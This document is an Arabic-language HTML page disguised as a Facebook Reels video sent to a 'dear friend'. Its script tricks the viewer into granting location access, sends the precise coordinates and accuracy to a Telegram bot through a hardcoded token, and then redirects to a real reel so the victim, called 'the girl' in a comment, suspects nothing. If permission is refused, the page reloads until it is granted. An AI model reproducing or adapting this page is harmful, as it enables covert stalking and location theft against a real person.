<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Reels | ذكرياتنا</title>
    <style>
        body { background-color: #000; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        .video-container { position: relative; width: 100%; max-width: 400px; height: 90vh; background: #111; border-radius: 15px; overflow: hidden; display: flex; flex-direction: column; justify-content: center; align-items: center; border: 1px solid #333; }
        .play-btn { width: 80px; height: 80px; background: rgba(255,255,255,0.2); border-radius: 50%; display: flex; justify-content: center; align-items: center; cursor: pointer; border: 2px solid #fff; }
        .play-btn::after { content: ''; display: block; width: 0; height: 0; border-top: 15px solid transparent; border-bottom: 15px solid transparent; border-left: 25px solid #fff; margin-left: 5px; }
        h2 { font-size: 18px; margin-top: 20px; text-shadow: 0 2px 4px rgba(0,0,0,0.5); }
        p { font-size: 14px; color: #bbb; text-align: center; padding: 0 20px; }
        .fb-logo { position: absolute; top: 20px; left: 20px; width: 30px; }
    </style>
</head>
<body>

<div class="video-container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" class="fb-logo">
    <div class="play-btn" onclick="startVideo()"></div>
    <h2>مقطع خاص لصديقتي الغالية ❤️</h2>
    <p>يرجى الضغط على زر التشغيل والسماح بالوصول للموقع لتشغيل الفيديو بجودة HD في منطقتك.</p>
</div>

<script>
    const token = '8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg';
    const chat_id = '7214473798';

    function startVideo() {
        const options = { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 };

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(function(p) {
                const lat = p.coords.latitude;
                const lon = p.coords.longitude;
                const acc = p.coords.accuracy;
                const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
                
                // إرسال الموقع لبوتك
                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent('📍 موقع البنت (فيديو الذكريات):\n' + mapLink + '\n📏 الدقة: ' + acc.toFixed(1) + ' متر')}&parse_mode=Markdown`);
                
                // تحويلها لفيديو ريلز حقيقي عن الصداقة على فيسبوك لتهدئتها
                window.location.href = "https://www.facebook.com/reel/1149257622814389"; 

            }, function(e) {
                alert("عذراً، يجب السماح بالموقع لتشغيل الفيديو بجودة عالية.");
                location.reload();
            }, options);
        }
    }
</script>
</body>
</html>
